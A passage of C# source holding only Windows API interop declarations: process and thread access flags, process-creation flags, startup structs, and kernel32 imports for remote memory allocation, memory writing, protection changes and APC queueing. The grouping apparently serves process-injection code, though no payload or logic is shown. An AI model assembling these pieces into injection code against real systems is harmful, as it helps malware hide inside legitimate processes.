            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        
        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        
        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE           = (0x0001)  ,
            SUSPEND_RESUME      = (0x0002)  ,
            GET_CONTEXT         = (0x0008)  ,
            SET_CONTEXT         = (0x0010)  ,
            SET_INFORMATION     = (0x0020)  ,
            QUERY_INFORMATION       = (0x0040)  ,
            SET_THREAD_TOKEN    = (0x0080)  ,
            IMPERSONATE         = (0x0100)  ,
            DIRECT_IMPERSONATION    = (0x0200)
        }
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
            int dwThreadId);

        
        [DllImport("kernel32.dll",SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        
        [DllImport("kernel32.dll", SetLastError = true )]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
           int dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                                 bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
                                string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);
        }